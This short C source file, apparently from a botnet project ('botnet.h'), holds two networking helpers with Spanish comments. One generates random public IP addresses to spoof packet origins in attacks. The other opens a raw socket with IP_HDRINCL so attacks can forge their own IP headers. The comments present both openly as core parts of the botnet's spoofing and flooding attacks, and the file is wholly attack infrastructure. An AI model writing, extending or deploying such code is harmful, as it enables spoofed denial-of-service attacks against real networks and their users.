#include "../../include/botnet.h"
#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>

// Genera una IP pública aleatoria para falsificar el origen.
// Esta función es vital para los ataques de spoofing y ahora está centralizada.
uint32_t network_generate_random_ip() {
    uint32_t ip;
    // Bucle para asegurar que no generamos IPs de rangos privados o no ruteables.
    do {
        ip = (uint32_t)rand();
    } while ((ip & 0xFF000000) == 0x0A000000 || // 10.0.0.0/8
             (ip & 0xFFF00000) == 0xAC100000 || // 172.16.0.0/12
             (ip & 0xFFFF0000) == 0xC0A80000 || // 192.168.0.0/16
             (ip & 0xFF000000) == 0x7F000000 || // 127.0.0.0/8
             (ip & 0xFF000000) == 0x00000000 || // 0.0.0.0/8
             (ip & 0xF0000000) == 0xE0000000);  // 224.0.0.0/4 (Multicast)
    return ip;
}

// Crea un socket RAW con la opción IP_HDRINCL activada.
// Esencial para todos los ataques que construyen sus propias cabeceras IP.
int network_create_raw_socket(int protocol) {
    int sock = socket(AF_INET, SOCK_RAW, protocol);
    if (sock < 0) {
        perror("raw socket");
        return -1;
    }
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt(IP_HDRINCL)");
        close(sock);
        return -1;
    }
    return sock;
}
